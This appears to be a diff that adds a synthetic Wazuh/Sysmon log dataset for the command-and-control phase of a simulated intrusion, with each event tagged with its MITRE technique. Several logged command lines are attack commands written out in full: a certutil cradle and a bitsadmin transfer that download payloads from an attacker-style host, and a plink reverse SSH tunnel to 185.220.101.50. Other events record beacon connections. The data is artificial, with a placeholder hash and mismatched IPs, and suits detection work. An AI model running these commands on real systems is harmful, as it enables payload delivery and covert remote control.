@@ -1,0 +1,672 @@
+{
+  "_metadata": {
+    "phase": "command-and-control",
+    "phase_index": 8,
+    "total_logs": 9,
+    "techniques": [
+      "T1071.001",
+      "T1105",
+      "T1572",
+      "T1573.002"
+    ]
+  },
+  "logs": [
+    {
+      "_comment": "Certutil download cradle (LOLBin)",
+      "sequence": 12,
+      "timestamp": "2026-02-24T08:01:07.995360Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1105",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1105"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1105"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 08:01:07.995",
+              "processGuid": "{FD12E5CD-WS01-0009-77DA5198D0E5}",
+              "processId": "1990",
+              "image": "C:\\Windows\\System32\\certutil.exe",
+              "commandLine": "certutil -urlcache -split -f http://update-cdn.com/payload.exe C:\\Users\\Public\\update.exe",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\user1",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{FD12E5CD-WS01-0008-3E21AAB0E5B5}",
+              "parentProcessId": "1859",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Certutil network connection",
+      "sequence": 13,
+      "timestamp": "2026-02-24T08:01:09.815831Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1105",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1105"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1105"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 08:01:07.995",
+              "processGuid": "{FD12E5CD-WS01-0009-77DA5198D0E5}",
+              "processId": "1990",
+              "image": "C:\\Windows\\System32\\certutil.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.0.0.50",
+              "sourcePort": "60639",
+              "destinationIp": "203.0.113.50",
+              "destinationHostname": "update-cdn.com",
+              "destinationPort": "80"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Bitsadmin download (LOLBin)",
+      "sequence": 14,
+      "timestamp": "2026-02-24T08:01:16.139873Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1105",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1105"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1105"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 08:01:16.139",
+              "processGuid": "{FD12E5CD-WS01-0010-E8611C5F939F}",
+              "processId": "2055",
+              "image": "C:\\Windows\\System32\\bitsadmin.exe",
+              "commandLine": "bitsadmin /transfer job /download /priority high http://update-cdn.com/stage2.exe C:\\Users\\Public\\stage2.exe",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\user1",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{FD12E5CD-WS01-0009-77DA5198D0E5}",
+              "parentProcessId": "1990",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Encrypted C2 channel (HTTPS beacon)",
+      "sequence": 49,
+      "timestamp": "2026-02-24T11:58:02.740819Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1573.002",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1573.002"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1573.002"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "ruleName": "technique_id=T1573,technique_name=Encrypted Channel",
+              "utcTime": "2026-02-24 11:58:02.740",
+              "processGuid": "{FD12E5CD-WS01-0041-007C3299AD1B}",
+              "processId": "5106",
+              "image": "C:\\Users\\Public\\beacon.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "10.0.0.50",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "57658",
+              "destinationIsIpv6": "false",
+              "destinationIp": "185.220.101.50",
+              "destinationPort": "443",
+              "destinationHostname": "update-cdn.com"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Encrypted C2 beacon 2",
+      "sequence": 50,
+      "timestamp": "2026-02-24T11:58:11.677433Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1573.002",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1573.002"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1573.002"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "ruleName": "technique_id=T1573,technique_name=Encrypted Channel",
+              "utcTime": "2026-02-24 11:58:11.677",
+              "processGuid": "{FD12E5CD-WS01-0042-CE37C1AC571A}",
+              "processId": "5106",
+              "image": "C:\\Users\\Public\\beacon.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "10.0.0.50",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "49949",
+              "destinationIsIpv6": "false",
+              "destinationIp": "185.220.101.50",
+              "destinationPort": "443",
+              "destinationHostname": "update-cdn.com"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Encrypted C2 beacon 3",
+      "sequence": 51,
+      "timestamp": "2026-02-24T11:58:17.902684Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1573.002",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1573.002"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1573.002"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "ruleName": "technique_id=T1573,technique_name=Encrypted Channel",
+              "utcTime": "2026-02-24 11:58:17.902",
+              "processGuid": "{FD12E5CD-WS01-0043-06E3B726DE90}",
+              "processId": "5106",
+              "image": "C:\\Users\\Public\\beacon.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "10.0.0.50",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "64635",
+              "destinationIsIpv6": "false",
+              "destinationIp": "185.220.101.50",
+              "destinationPort": "443",
+              "destinationHostname": "update-cdn.com"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "SSH tunnel via plink.exe",
+      "sequence": 52,
+      "timestamp": "2026-02-24T11:58:25.182771Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1572",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1572"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1572"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 11:58:25.182",
+              "processGuid": "{FD12E5CD-WS01-0044-33454BC42908}",
+              "processId": "5449",
+              "image": "C:\\Users\\Public\\plink.exe",
+              "commandLine": "plink.exe -ssh -R 8080:127.0.0.1:80 attacker@185.220.101.50",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\user1",
+              "integrityLevel": "High",
+              "hashes": "SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
+              "parentProcessGuid": "{FD12E5CD-WS01-0043-06E3B726DE90}",
+              "parentProcessId": "5348",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "SSH tunnel connection",
+      "sequence": 53,
+      "timestamp": "2026-02-24T11:58:30.405181Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1572",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1572"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1572"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 11:58:30.405",
+              "processGuid": "{FD12E5CD-WS01-0044-33454BC42908}",
+              "processId": "5449",
+              "image": "C:\\Users\\Public\\plink.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.0.0.50",
+              "sourcePort": "59768",
+              "destinationIp": "185.220.101.50",
+              "destinationPort": "22"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "C2 beacon callback",
+      "sequence": 54,
+      "timestamp": "2026-02-24T11:58:39.963711Z",
+      "attack_phase": "command-and-control",
+      "technique": "T1071.001",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 6,
+          "description": "Sysmon - Event 3: Network connection detected",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1071.001"
+            ],
+            "tactic": [
+              "Command And Control"
+            ],
+            "technique": [
+              "T1071.001"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 11:58:39.963",
+              "processGuid": "{FD12E5CD-WS01-0046-9FF21429DF91}",
+              "processId": "5630",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\user1",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "10.0.0.50",
+              "sourcePort": "63401",
+              "destinationIp": "203.0.113.50",
+              "destinationHostname": "update-cdn.com",
+              "destinationPort": "443"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
